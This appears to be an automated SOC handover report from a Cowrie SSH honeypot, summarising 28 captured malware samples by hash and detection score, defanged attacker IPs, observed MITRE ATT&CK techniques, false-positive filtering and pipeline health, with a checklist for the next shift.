## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `157.245.56[.]194` | SG | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `223.123.35[.]135` | PK | CMPak Limited | **100** ⚠️ | 10 |
| `14.103.115[.]213` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `195.184.76[.]4` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `20.116.34[.]103` | CA | Microsoft Corporation | **100** ⚠️ | 36 |
| `103.203.57[.]19` | US | Beijing Tiantexin Tech. Co., Ltd. | **100** ⚠️ | 50 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `142.171.12[.]201` | US | MULTACOM CORPORATION | **100** ⚠️ | 0 |
| `194.48.248[.]43` | MD | OvO Systems Ltd. | **100** ⚠️ | 44 |
| `54.227.126[.]11` | US | Amazon Technologies Inc. | **100** ⚠️ | 47 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (53 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 15 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 34 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1332 cases |
| Tool 34  | Credential Extractor        | ✅ 39 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 43 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 53 filtered (4.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 23 priority case(s) shown individually · 24 recon entry/entries in table (11 group(s) consolidating 1243 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-20T15:30:32Z_
